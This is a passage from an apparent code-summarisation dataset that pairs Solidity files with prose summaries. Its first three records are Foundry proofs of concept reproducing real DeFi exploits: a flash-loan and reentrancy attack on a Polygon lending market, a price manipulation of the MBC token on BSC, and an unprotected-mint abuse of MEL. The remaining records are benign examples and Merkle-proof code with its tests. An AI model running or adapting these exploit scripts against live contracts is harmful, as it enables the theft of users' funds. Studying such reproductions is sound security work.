WETH9(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);\n    IERC20 private constant stMATIC = IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);\n\n    ILendingPool   private constant aaveLendingPool = ILendingPool(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);\n    IBalancerVault private constant balancerVault   = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);\n\n    ICurvePool private constant vyperContract = ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);\n    IERC20     private constant stMATIC_f     = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);      // Curve LP token\n    BeefyVault private constant beefyVault    = BeefyVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);  // mooCurvestMATIC-MATIC\n\n    IUnitroller   private constant unitroller = IUnitroller(0x627742AaFe82EB5129DD33D237FF318eF5F76CBC);\n    IRouter       private constant router     = IRouter(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);\n    Uni_Router_V3 private constant routerV3   = Uni_Router_V3(0xf5b509bB0909a69B1c207E495f687a596C168E12);\n\n    CErc20Interface private constant CErc20_mmooCurvestMATIC_MATIC_4 = CErc20Interface(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);\n    ICErc20Delegate private constant CErc20Delegate_mMAI_4           = ICErc20Delegate(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);\n\n    IERC20 private constant miMATIC = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1);  // MAI stablecoin\n    IERC20 private constant USDC    = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);\n\n    function setUp() public {\n        vm.createSelectFork(\"https://polygon.llamarpc.com\", 34716800);  // fork Polygon at block 34716800\n        vm.deal(address(this), 0);  // set address(this).balance to 0\n    }\n\n    function testHack() external {\n        _aaveFlashLoan();\n\n        console.log(\"\\n Attacker's profit:\");\n        console.log(\"stMATIC:\", stMATIC.balanceOf(address(this)) / 1e18);\n        console.log(\"WMATIC:\", WMATIC.balanceOf(address(this)) / 1e18);\n    }\n\n    function _aaveFlashLoan() internal {\n        // flashloan WMATIC from Aave\n        address[] memory assets = new address[](1); \n        assets[0] = address(WMATIC); \n\n        uint256[] memory amounts = new uint256[](1); \n        amounts[0] = 15_419_963 ether;\n\n        uint256[] memory modes = new uint256[](1); \n        modes[0] = 0;\n\n        aaveLendingPool.flashLoan(address(this), assets, amounts, modes, address(this), \"\", 0);\n    }\n\n    function executeOperation(       // Aave callback\n        address[] memory assets,\n        uint256[] memory amounts,\n        uint256[] memory premiums,\n        address initiator,\n        bytes memory params\n    ) external returns (bool) {\n        _balancerFlashLoan();  \n\n        WMATIC.approve(address(aaveLendingPool), type(uint256).max);  // repay\n        return true;\n    }\n\n    function _balancerFlashLoan() internal {\n        // flashloan WMATIC and stMATIC from Balancer\n        address[] memory tokens = new address[](2);\n        tokens[0] = address(WMATIC);\n        tokens[1] = address(stMATIC);\n\n        uint256[] memory amountsBalancer = new uint256[](2);\n        amountsBalancer[0] = 34_580_036 ether;   // + 15_419_963 Aave -> 50M debt\n        amountsBalancer[1] = 19_664_260 ether;   \n        \n        balancerVault.flashLoan(address(this), tokens, amountsBalancer, \"\");\n    }\n\n    function receiveFlashLoan(       // Balancer callback\n        IERC20[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        _exploit();\n        _liquidate();\n        _sellAll();\n\n        // repay\n        stMATIC.transfer(address(balancerVault), 19_664_260 ether);\n        WMATIC.transfer(address(balancerVault), 34_580_036 ether);\n    }\n\n    function _exploit() internal {   \n        // add liquidity to WMATIC/stMATIC Curve pool, receive Curve LP tokens stMATIC_f\n        WMATIC.approve(address(vyperContract), type(uint256).max);\n        stMATIC.approve(address(vyperContract), type(uint256).max);\n\n        vyperContract.add_liquidity([uint256(19_664_260 ether), uint256(49_999_999 ether)], 0);   // mint 34_640_026 stMATIC_f   \n\n        address[] memory market = new address[](1);\n        market[0] = address(CErc20_mmooCurvestMATIC_MATIC_4);   \n        unitroller.enterMarkets(market);\n\n        // deposit 90_000 stMATIC_f and mint 85901 mooCurvestMATIC-MATIC (BeefyVault token) as collateral to Market via Beefy Vault\n        stMATIC_f.approve(address(beefyVault), type(uint256).max);\n        beefyVault.deposit(90_000 ether);\n\n        // use 85_901 mooCurvestMATIC-MATIC to mint 429_505 Ctokens\n        beefyVault.approve(address(CErc20_mmooCurvestMATIC_MATIC_4), type(uint256).max);\n        CErc20_mmooCurvestMATIC_MATIC_4.mint(beefyVault.balanceOf(address(this)));  \n\n        // remove liquidity from WMATIC/stMATIC Curve pool: receive WMATIC, stMATIC, miMATIC. This step increases collateral price\n        vyperContract.remove_liquidity(stMATIC_f.balanceOf(address(this)), [uint256(0), uint256(0)], true);  // burn stMATIC_f, trigger receive()  \n    }\n\n    function _liquidate() internal {\n        Liquidator liquidator = new Liquidator();\n        miMATIC.transfer(address(liquidator), miMATIC.balanceOf(address(this)));  // use MAI to liquidate collateral\n        liquidator.liquidate(address(this));\n\n        // take back stMATIC_f\n        beefyVault.withdrawAll();\n\n        // remove liquidity from Curve pool 2nd time \n        vyperContract.remove_liquidity(stMATIC_f.balanceOf(address(this)), [uint256(0), uint256(0)], true);  // burn stMATIC_f, trigger receive()\n    }\n\n    receive() external payable {\n        //  Borrow MAI with expensive collateral \n        // (,uint256 amount,) = unitroller.getAccountLiquidity(address(this));  191\n        CErc20Delegate_mMAI_4.borrow(250_000 ether);  // 250_000 miMATIC \n    }\n\n    function _sellAll() internal {\n        // wrap all native MATIC (from remove_liquidity) to WMATIC\n        WMATIC.deposit{value: address(this).balance}();  \n\n        // swap all miMATIC for WMATIC to repay Aave \n        miMATIC.approve(address(router), type(uint256).max);\n        address [] memory path = new address[](3);\n        path[0] = address(miMATIC);\n        path[1] = address(USDC);\n        path[2] = address(WMATIC);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(miMATIC.balanceOf(address(this)), 0, path, address(this), type(uint256).max);\n\n        // swap some WMATIC for stMATIC to repay Balancer \n        WMATIC.approve(address(routerV3), type(uint256).max);   \n        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({\n            tokenIn: address(WMATIC),\n            tokenOut: address(stMATIC),\n            deadline: type(uint256).max,\n            recipient: address(this),\n            amountIn: 1355 ether,  \n            amountOutMinimum: 0,\n            sqrtPriceLimitX96: 0\n        });\n        routerV3.exactInputSingle(_Params);\n    }\n}\n\n/* -------------------- Interface -------------------- */\ninterface CErc20Interface {\n    function mint(uint256 mintAmount) external returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function borrow(uint256 borrowAmount) external returns (uint256);\n    function redeem(uint256 amount) external;\n    function withdrawAll() external;\n    function transfer(address to, uint256 amount) external returns (bool);\n}\n\ninterface ICErc20Delegate {\n    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral)  external returns (uint256);\n    function borrow(uint256 borrowAmount) external returns (uint256);       \n}\n\ninterface BeefyVault {\n    function deposit(uint256 _amount) external;\n    function withdraw(uint256 _amount) external;\n    function withdrawAll() external;\n    function balance() external view returns (uint256);\n    function token() external view returns (address);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address owner) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\ninterface IUnitroller {\n    function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);\n    function exitMarket(address cTokenAddress) external returns (uint256);\n    function cTokensByUnderlying(address) external view returns (address);\n    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);\n}\n\ninterface IERC20 {\n    function transfer(address to, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ninterface WETH9 {\n    function deposit() external payable;\n    function transfer(address to, uint value) external returns (bool);\n    function approve(address guy, uint wad) external returns (bool);\n    function withdraw(uint wad) external;\n    function balanceOf(address) external view returns (uint256);\n}\n\ninterface ILendingPool {\n    function flashLoan(\n        address receiverAddress,\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata modes,\n        address onBehalfOf,\n        bytes calldata params,\n        uint16 referralCode\n    ) external;\n}\n\ninterface IBalancerVault {\n    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData) external;\n}\n\ninterface ICurvePool {\n    function remove_liquidity(uint256 _amount, uint256[2] calldata min_amounts, bool donate_dust) external;\n    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external returns (uint256);\n}\n\ninterface IRouter {\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n}\n\ninterface Uni_Router_V3 {\n    struct ExactInputSingleParams {\n        address tokenIn;\n        address tokenOut;\n        address recipient;\n        uint256 deadline;\n        uint256 amountIn;\n        uint256 amountOutMinimum;\n        uint160 sqrtPriceLimitX96;\n    }\n    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);\n}",
        "summary": "This code represents a market exploit test in Solidity. The contract includes various functions, interfaces, and constant variables related to flash loans, liquidity pools, collateral trading, and borrowing in decentralized platforms like Aave and Balancer. The contract tries to exploit a vulnerability in the platform to execute a flash loan against stMATIC and WMATIC tokens and make a profit by taking advantage of collateral prices, liquidating the borrowed tokens and transferring them to another account. The contract also defines a Liquidator contract and a set of interfaces for various ERC20 tokens and platforms used in the exploit.",
        "id": "135c8cfe-62c9-4f4c-9f3b-f8597c363154"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/AnciliaInc/status/1597742575623888896\n// https://twitter.com/CertiKAlert/status/1597639717096460288\n// @TX\n// https://phalcon.blocksec.com/tx/bsc/0xdc53a6b5bf8e2962cf0e0eada6451f10956f4c0845a3ce134ddb050365f15c86\n\n\ninterface IMBC is IERC20 {\n   function swapAndLiquifyStepv1() external;\n}\n\ncontract ContractTest is DSTest {\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 ETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);\n    IMBC MBC = IMBC(0x4E87880A72f6896E7e0a635A5838fFc89b13bd17);\n    address dodo = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;\n\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1);\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    uint dodoFlahloanAmount;\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23474460);\n    }\n\n    function testExploit() public {\n        USDT.approve(address(Router), type(uint256).max);\n        MBC.approve(address(Router), type(uint256).max);\n        dodoFlahloanAmount = USDT.balanceOf(dodo);\n        DVM(dodo).flashLoan(\n            0,\n            dodoFlahloanAmount,\n            address(this),\n            new bytes(1)\n        );\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function DPPFlashLoanCall(\n        address sender,\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        bytes calldata data\n    ) external {\n\n        // Intial rate MBC/USDT -> 1.1365032200116891/1\n        // Pair getReserves -> 12475110456913920021663 / 10976748888389080860664\n        address[] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(MBC);\n        uint[] memory values = Router.getAmountsOut(150_000 * 10**18, path);\n\n        USDT.transfer(address(Pair), 150_000 * 10**18);\n\n        Pair.swap(\n            values[1],\n            0,\n            address(this),\n            \"\"\n        );\n\n        MBC.swapAndLiquifyStepv1();\n\n        Pair.sync();\n\n        // Altered rate MBC/USDT -> 0.0052991665156216445/1\n        // Pair getReserves -> 900258815097978209431 / 169886870405763976494888\n\n        USDT.transfer(address(Pair), 1001); // function() _isAddLiquidityV1()\n        MBC.transfer(address(Pair), MBC.balanceOf(address(this)));\n        (uint MBCReserve, uint USDTReserve, ) = Pair.getReserves();\n        uint amountIn = MBC.balanceOf(address(Pair)) - MBCReserve;\n        path[0] = address(MBC);\n        path[1] = address(USDT); \n        values = Router.getAmountsOut(amountIn, path);\n\n        Pair.swap(\n            0,\n            values[1],\n            address(this),\n            \"\"\n        );\n\n        USDT.transfer(dodo, dodoFlahloanAmount);\n    }\n\n}\n",
        "summary": "This code is a Solidity smart contract that aims to exploit a vulnerability in the DODO decentralized exchange (DEX) on the Binance Smart Chain (BSC) network. \n\nThe contract imports interfaces and libraries from other contracts and sets up several variables required for the exploit. It also defines a function called `testExploit` that performs the actual exploitation by making a `flashLoan` call to the DODO DEX, which provides the contract with a large amount of USDT tokens to carry out the attack. \n\nThe function `DPPFlashLoanCall` is the entry point that the DODO DEX calls back after providing the flash loan. This function performs a series of swaps and transfers between the USDT and MBC tokens, attempting to manipulate the exchange rate in favor of the attacker. Once these steps are complete, the exploited USDT tokens are transferred back to the DODO DEX, and any profits obtained from the attack are retained by the attacker. \n\nOverall, this code is an example of a malicious smart contract that attempts to exploit vulnerabilities in the implementation of decentralized exchanges to make unauthorized profits.",
        "id": "1cdfd416-951a-43f1-98d1-099da073cfbb"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/peckshield/status/1654667621139349505\n// @TX\n// https://bscscan.com/tx/0x3f1973fe56de5ecd59a815d3b14741cf48385903b0ccfe248f7f10c2765061f7\n// @Summary\n// critical function lack of access control\n\ninterface IMEL is IERC20 {\n    function mint(address account, uint256 amount, string memory txId) external returns (bool);\n}\n\ncontract ContractTest is Test {\n    IMEL MEL = IMEL(0x9A1aEF8C9ADA4224aD774aFdaC07C24955C92a54);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x6a8C4448763C08aDEb80ADEbF7A29b9477Fa0628);\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 27_960_445);\n    }\n\n    function testExploit() external {\n        uint256 mintAmount = MEL.balanceOf(address(Pair)) * 50;\n        MEL.mint(address(this), mintAmount, \"\");\n        MEL.approve(address(Router), mintAmount);\n        address[] memory path = new address[](2);\n        path[0] = address(MEL);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            mintAmount, 0, path, address(this), block.timestamp\n        );\n\n        emit log_named_decimal_uint(\n            \"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), USDT.decimals()\n        );\n    }\n}\n",
        "summary": "This code defines a Solidity contract that tests an exploit against a set of smart contracts on the Binance Smart Chain. The exploit involves minting a large amount of a specific token (MEL), swapping it for another token (USDT), and then checking the balance of USDT in the attacker's account. The contract imports various interfaces and libraries, and the function `setUp` initializes the cheat codes before the exploit is tested in the `testExploit` function.",
        "id": "1cd616b6-e611-4ac2-82db-61914d4f31c6"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract MemoryArray {\n  uint[] foo;\n\n  function MemoryArray () {\n    uint[] memory bar = new uint[](5);\n    bytes memory qux = new bytes(5);\n\n    // dynamically resize storage array\n    foo.length = 6;\n    foo[5] = 1;\n    assert(foo[5] == 1);\n\n    // doesn't work\n    // bar.length = 6;\n    // qux.length = 6;\n  }\n}\n",
        "summary": "This is a Solidity smart contract that defines a contract named `MemoryArray`. It contains a storage array named `foo` of type `uint[]`. The constructor of the contract creates a dynamic memory array `bar` of type `uint[]` with a length of 5, and a dynamic memory array `qux` of type `bytes` with a length of 5. \n\nThe code then shows an example of how to dynamically resize the storage array `foo` to a length of 6, and assigns a value of 1 to the last index of the array. It then uses an `assert` statement to check whether the value of the last index of `foo` is equal to 1.\n\nThe code also has commented out code that attempts to resize the memory arrays `bar` and `qux`, which is not allowed because dynamic memory arrays cannot be resized after being initialized.",
        "id": "4f58e736-4e1c-4469-b046-c5c2b5c893bd"
    },
    {
        "code": "// This code has not been professionally audited, therefore I cannot make any promises about\n// safety or correctness. Use at own risk.\n\npragma solidity ^0.4.20;\n\ncontract MemoryArrayBuilding {\n\n    struct Item {\n        string name;\n        string category;\n        address owner;\n        uint32 zipcode;\n        uint32 price;\n    }\n\n    Item[] public items;\n\n    mapping(address => uint) public ownerItemCount;\n\n    function getItemIDsByOwner(address _owner) public view returns (uint[]) {\n        uint[] memory result = new uint[](ownerItemCount[_owner]);\n        uint counter = 0;\n\n        for (uint i = 0; i < items.length; i++) {\n            if (items[i].owner == _owner) {\n                result[counter] = i;\n                counter++;\n            }\n        }\n        return result;\n    }\n}\n",
        "summary": "This code defines a Solidity smart contract \"MemoryArrayBuilding\" with a struct \"Item\" containing several variables such as name, category, owner, zipcode, and price. The contract also has a dynamic array \"items\" containing all the items and a mapping \"ownerItemCount\" that tracks the number of items owned by each address. The function \"getItemIDsByOwner\" allows an address to view all the items they own by looping through the items array and returning an array of item IDs owned by that address.",
        "id": "4fbffadc-04e1-4777-9ce2-d5bb9258b8eb"
    },
    {
        "code": "pragma solidity ^0.4.20;\n\ncontract MemoryArrayBuildingCheap {\n\n    struct Item {\n        string name;\n        string category;\n        address owner;\n        uint32 zipcode;\n        uint32 price;\n    }\n\n    Item[] public items;\n\n    mapping(address => uint) public ownerItemCount;\n\n    function getItemsbyOwner(address _owner) public view returns (uint[]) {\n        uint[] memory result = new uint[](ownerItemCount[_owner]);\n\n        uint counter = 0;\n        for (uint i = 0; i < items.length; i++) {\n            if (items[i].owner == _owner) {\n                result[counter] = i;\n                counter++;\n            }\n        }\n        return result;\n    }\n\n    function initialize() public {\n        Item memory tempItem = Item(\"test1\", \"house\", 0xca35b7d915458ef540ade6068dfe2f44e8fa733c, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0xca35b7d915458ef540ade6068dfe2f44e8fa733c]++;\n\n        tempItem = Item(\"test2\", \"house\", 0x0ad04da547702b9ca134f929e3c3009424b7da70, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0x0ad04da547702b9ca134f929e3c3009424b7da70]++;\n\n        tempItem = Item(\"test3\", \"house\", 0xca35b7d915458ef540ade6068dfe2f44e8fa733c, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0xca35b7d915458ef540ade6068dfe2f44e8fa733c]++;\n\n        tempItem = Item(\"test4\", \"house\", 0x0ad04da547702b9ca134f929e3c3009424b7da70, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0x0ad04da547702b9ca134f929e3c3009424b7da70]++;\n\n        tempItem = Item(\"test5\", \"house\", 0x0ad04da547702b9ca134f929e3c3009424b7da70, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0x0ad04da547702b9ca134f929e3c3009424b7da70]++;\n\n        tempItem = Item(\"test6\", \"house\", 0x0ad04da547702b9ca134f929e3c3009424b7da70, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0x0ad04da547702b9ca134f929e3c3009424b7da70]++;\n\n        tempItem = Item(\"test7\", \"house\", 0x0ad04da547702b9ca134f929e3c3009424b7da70, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0x0ad04da547702b9ca134f929e3c3009424b7da70]++;\n\n        tempItem = Item(\"test8\", \"house\", 0x0ad04da547702b9ca134f929e3c3009424b7da70, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0x0ad04da547702b9ca134f929e3c3009424b7da70]++;\n\n        tempItem = Item(\"test9\", \"house\", 0x0ad04da547702b9ca134f929e3c3009424b7da70, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0x0ad04da547702b9ca134f929e3c3009424b7da70]++;\n\n        tempItem = Item(\"test10\", \"house\", 0x0ad04da547702b9ca134f929e3c3009424b7da70, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0x0ad04da547702b9ca134f929e3c3009424b7da70]++;\n    }\n}\n\ncontract MemoryArrayBuildingExpensive {\n\n    struct Item {\n        string name;\n        string category;\n        address owner;\n        uint32 zipcode;\n        uint32 price;\n    }\n\n    Item[] public items;\n\n    mapping(address => uint) public ownerItemCount;\n\n    function getItemsbyOwner(address _owner) public returns (uint[]) {\n        uint[] memory result = new uint[](ownerItemCount[_owner]);\n\n        uint counter = 0;\n        for (uint i = 0; i < items.length; i++) {\n            if (items[i].owner == _owner) {\n                result[counter] = i;\n                counter++;\n            }\n        }\n        return result;\n    }\n\n    function initialize() public {\n        Item memory tempItem = Item(\"test1\", \"house\", 0xca35b7d915458ef540ade6068dfe2f44e8fa733c, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0xca35b7d915458ef540ade6068dfe2f44e8fa733c]++;\n\n        tempItem = Item(\"test2\", \"house\", 0x0ad04da547702b9ca134f929e3c3009424b7da70, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0x0ad04da547702b9ca134f929e3c3009424b7da70]++;\n\n        tempItem = Item(\"test3\", \"house\", 0xca35b7d915458ef540ade6068dfe2f44e8fa733c, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0xca35b7d915458ef540ade6068dfe2f44e8fa733c]++;\n\n        tempItem = Item(\"test4\", \"house\", 0x0ad04da547702b9ca134f929e3c3009424b7da70, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0x0ad04da547702b9ca134f929e3c3009424b7da70]++;\n\n        tempItem = Item(\"test5\", \"house\", 0x0ad04da547702b9ca134f929e3c3009424b7da70, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0x0ad04da547702b9ca134f929e3c3009424b7da70]++;\n\n        tempItem = Item(\"test6\", \"house\", 0x0ad04da547702b9ca134f929e3c3009424b7da70, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0x0ad04da547702b9ca134f929e3c3009424b7da70]++;\n\n        tempItem = Item(\"test7\", \"house\", 0x0ad04da547702b9ca134f929e3c3009424b7da70, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0x0ad04da547702b9ca134f929e3c3009424b7da70]++;\n\n        tempItem = Item(\"test8\", \"house\", 0x0ad04da547702b9ca134f929e3c3009424b7da70, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0x0ad04da547702b9ca134f929e3c3009424b7da70]++;\n\n        tempItem = Item(\"test9\", \"house\", 0x0ad04da547702b9ca134f929e3c3009424b7da70, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0x0ad04da547702b9ca134f929e3c3009424b7da70]++;\n\n        tempItem = Item(\"test10\", \"house\", 0x0ad04da547702b9ca134f929e3c3009424b7da70, 80331, 212);\n        items.push(tempItem);\n        ownerItemCount[0x0ad04da547702b9ca134f929e3c3009424b7da70]++;\n    }\n}\n",
        "summary": "This code is implementing two Solidity contracts which store items and allow retrieval of them by owner address. Both contracts have a struct `Item`, which consists of a name, category, owner address, zipcode, and price. There is also a public array of `Item` structures `items`, and a mapping `ownerItemCount` which maps the owner address to the number of items that owner currently has. The first contract, `MemoryArrayBuildingCheap`, has a `getItemsbyOwner` function that retrieves all the items for a specified owner, and a `initialize` function that adds 10 test items to the `items` array. The second contract, `MemoryArrayBuildingExpensive`, is identical to the first, except for the fact that its `getItemsbyOwner` function is not marked as `view`, and therefore requires gas to be called.",
        "id": "c4bbdf8e-0a4a-4b62-bdf6-7a044feb5703"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.0;\n\n/// @notice Gas optimized merkle proof verification library.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/utils/MerkleProofLib.sol)\n/// @author Modified from Solady (https://github.com/Vectorized/solady/blob/main/src/utils/MerkleProofLib.sol)\nlibrary MerkleProofLib {\n    function verify(\n        bytes32[] calldata proof,\n        bytes32 root,\n        bytes32 leaf\n    ) internal pure returns (bool isValid) {\n        /// @solidity memory-safe-assembly\n        assembly {\n            if proof.length {\n                // Left shifting by 5 is like multiplying by 32.\n                let end := add(proof.offset, shl(5, proof.length))\n\n                // Initialize offset to the offset of the proof in calldata.\n                let offset := proof.offset\n\n                // Iterate over proof elements to compute root hash.\n                // prettier-ignore\n                for {} 1 {} {\n                    // Slot where the leaf should be put in scratch space. If\n                    // leaf > calldataload(offset): slot 32, otherwise: slot 0.\n                    let leafSlot := shl(5, gt(leaf, calldataload(offset)))\n\n                    // Store elements to hash contiguously in scratch space.\n                    // The xor puts calldataload(offset) in whichever slot leaf\n                    // is not occupying, so 0 if leafSlot is 32, and 32 otherwise.\n                    mstore(leafSlot, leaf)\n                    mstore(xor(leafSlot, 32), calldataload(offset))\n\n                    // Reuse leaf to store the hash to reduce stack operations.\n                    leaf := keccak256(0, 64) // Hash both slots of scratch space.\n\n                    offset := add(offset, 32) // Shift 1 word per cycle.\n\n                    // prettier-ignore\n                    if iszero(lt(offset, end)) { break }\n                }\n            }\n\n            isValid := eq(leaf, root) // The proof is valid if the roots match.\n        }\n    }\n}\n",
        "summary": "This is a gas-optimized Merkle proof verification library written in Solidity. It contains a single function called \"verify\" that takes in a Merkle proof, a root hash, and a leaf hash. The function then iterates through the proof and computes the root hash, and checks if the computed root hash matches the provided root hash. If the two hashes match, then the proof is considered to be valid and the function returns true.",
        "id": "db90cbb6-6d7e-44dd-bfb2-122a4923cd0a"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.0;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\n\nimport {MerkleProofLib} from \"../utils/MerkleProofLib.sol\";\n\ncontract MerkleProofLibTest is DSTestPlus {\n    function testVerifyEmptyMerkleProofSuppliedLeafAndRootSame() public {\n        bytes32[] memory proof;\n        assertBoolEq(this.verify(proof, 0x00, 0x00), true);\n    }\n\n    function testVerifyEmptyMerkleProofSuppliedLeafAndRootDifferent() public {\n        bytes32[] memory proof;\n        bytes32 leaf = \"a\";\n        assertBoolEq(this.verify(proof, 0x00, leaf), false);\n    }\n\n    function testValidProofSupplied() public {\n        // Merkle tree created from leaves ['a', 'b', 'c'].\n        // Leaf is 'a'.\n        bytes32[] memory proof = new bytes32[](2);\n        proof[0] = 0xb5553de315e0edf504d9150af82dafa5c4667fa618ed0a6f19c69b41166c5510;\n        proof[1] = 0x0b42b6393c1f53060fe3ddbfcd7aadcca894465a5a438f69c87d790b2299b9b2;\n        bytes32 root = 0x5842148bc6ebeb52af882a317c765fccd3ae80589b21a9b8cbf21abb630e46a7;\n        bytes32 leaf = 0x3ac225168df54212a25c1c01fd35bebfea408fdac2e31ddd6f80a4bbf9a5f1cb;\n        assertBoolEq(this.verify(proof, root, leaf), true);\n    }\n\n    function testVerifyInvalidProofSupplied() public {\n        // Merkle tree created from leaves ['a', 'b', 'c'].\n        // Leaf is 'a'.\n        // Proof is same as testValidProofSupplied but last byte of first element is modified.\n        bytes32[] memory proof = new bytes32[](2);\n        proof[0] = 0xb5553de315e0edf504d9150af82dafa5c4667fa618ed0a6f19c69b41166c5511;\n        proof[1] = 0x0b42b6393c1f53060fe3ddbfcd7aadcca894465a5a438f69c87d790b2299b9b2;\n        bytes32 root = 0x5842148bc6ebeb52af882a317c765fccd3ae80589b21a9b8cbf21abb630e46a7;\n        bytes32 leaf = 0x3ac225168df54212a25c1c01fd35bebfea408fdac2e31ddd6f80a4bbf9a5f1cb;\n        assertBoolEq(this.verify(proof, root, leaf), false);\n    }\n\n    function verify(\n        bytes32[] calldata proof,\n        bytes32 root,\n        bytes32 leaf\n    ) external pure returns (bool) {\n        return MerkleProofLib.verify(proof, root, leaf);\n    }\n}\n",
        "summary": "This is a Solidity smart contract that tests the functionality of a MerkleProofLib library. It includes four test functions: testVerifyEmptyMerkleProofSuppliedLeafAndRootSame, testVerifyEmptyMerkleProofSuppliedLeafAndRootDifferent, testValidProofSupplied, and testVerifyInvalidProofSupplied. These test functions create merkle trees and verify their proofs to see if they function as expected. The contract imports the DSTestPlus.sol and MerkleProofLib.sol libraries and contains the verify function which itself uses the MerkleProofLib.verify function to verify merkle proofs.",
        "id": "5c8caabf-0c4d-4721-a5fb-b9ad2d301425"
    },
    {
